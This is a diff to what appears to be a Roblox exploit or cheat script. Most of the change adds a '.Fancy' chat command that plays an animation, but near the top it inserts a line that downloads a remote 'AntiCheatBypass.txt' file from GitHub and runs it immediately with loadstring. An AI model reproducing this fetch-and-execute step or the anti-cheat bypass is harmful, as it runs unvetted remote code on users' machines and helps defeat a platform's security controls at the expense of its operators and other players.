@@ -54,6 +54,7 @@ if Testing == false then
 	setfpscap(5)
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MsorkyScripts/OpenSourceAntiCheat/main/AntiCheatBypass.txt"))()
 getgenv().Executed = true
 
 --// Code --//
@@ -349,6 +350,7 @@ local function RemoveWallet()
 end
 local CurrAnim
 local AbbreviationOptions = {
+
 	["k"] = 1000,
 	["m"] = 1000000
 }
@@ -557,6 +559,15 @@ local function Initiate()
 				end
 				local Anim = Instance.new("Animation")
 				Anim.AnimationId = "http://www.roblox.com/asset/?id=3333499508"
+				CurrAnim = game.Players.LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Anim)
+				CurrAnim:Play()
+				CurrAnim:AdjustSpeed()
+			elseif Message == ".Fancy" then
+				if CurrAnim and CurrAnim.IsPlaying then
+					CurrAnim:Stop()
+				end
+				local Anim = Instance.new("Animation")
+				Anim.AnimationId = "http://www.roblox.com/asset/?id=3934988903"
 				CurrAnim = game.Players.LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Anim)
 				CurrAnim:Play()
 				CurrAnim:AdjustSpeed()
